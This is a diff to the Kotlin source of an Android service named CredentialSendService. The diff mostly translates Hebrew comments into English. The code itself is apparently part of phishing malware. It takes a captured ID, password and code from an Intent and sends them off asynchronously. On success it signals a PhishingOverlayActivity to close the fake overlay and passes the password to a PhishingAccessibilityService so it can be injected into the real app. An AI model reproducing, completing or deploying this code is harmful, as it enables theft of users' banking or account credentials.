@@ -18,12 +18,11 @@ class CredentialSendService : Service() {
         private const val TAG = "CredentialSendService"
     }
 
-    // מאפשר להריץ את שליחת הקרדנציאלס בצורה אסינכרונית ונקייה
+    // Allows running credential sending asynchronously and cleanly
     private val serviceJob = Job()
     private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // חילוץ הנתונים מה-Intent
         val idNumber = intent?.getStringExtra("id") ?: run {
             Log.e(TAG, "ID is missing from intent")
             stopSelf()
@@ -38,19 +37,17 @@ class CredentialSendService : Service() {
 
         val codeValue = intent.getStringExtra("code") ?: ""
 
-        // יצירת אובייקט Credentials
         val credentials = Credentials(
             id = idNumber,
             password = password,
             code = codeValue
         )
 
-        // שליחת הנתונים בצורה אסינכרונית
         serviceScope.launch {
             sendCredentials(credentials)
         }
 
-        // נעצור את השירות בעצמנו לאחר הסיום
+        // We'll stop the service ourselves after completion
         return START_NOT_STICKY
     }
 
@@ -62,28 +59,23 @@ class CredentialSendService : Service() {
             onSuccess = {
                 Log.i(TAG, "Credentials sent successfully")
 
-                // 1. שולחים Broadcast להודעה שהשליחה הצליחה
-                // מי מקבל? PhishingOverlayActivity עם resultReceiver
-                // התוצאה: פותח את האפליקציה האמיתית וסוגר את ה-overlay
+                // 1. Send Broadcast message that sending succeeded
+                // Who receives? PhishingOverlayActivity with resultReceiver
+                // Result: opens real application and closes overlay
                 sendBroadcast(Intent(Constants.ACTION_CREDENTIALS_OK))
 
-                // 2. Broadcast עם הסיסמה ל-AccessibilityService
-                // מי מקבל? PhishingAccessibilityService עם injectorReceiver
-                // התוצאה: שומר את הסיסמה להזרקה אוטומטית לאפליקציה האמיתית
+                // 2. Broadcast with password to AccessibilityService
+                // Who receives? PhishingAccessibilityService with injectorReceiver
+                // Result: saves password for automatic injection into real application
                 sendBroadcast(Intent(Constants.ACTION_INJECT_PASSWORD).apply {
                     putExtra("password", credentials.password)
                 })
-
-                // עצירת השירות
+                // Stop service
                 stopSelf()
             },
             onFailure = { exception ->
                 Log.e(TAG, "Failed to send credentials", exception)
-
-                // שליחת הודעה על כישלון
                 sendBroadcast(Intent(Constants.ACTION_CREDENTIALS_FAILED))
-
-                // עצירת השירות
                 stopSelf()
             }
         )
@@ -93,7 +85,6 @@ class CredentialSendService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
-        // ביטול כל המשימות האסינכרוניות
         serviceJob.cancel()
         Log.d(TAG, "Service destroyed")
     }
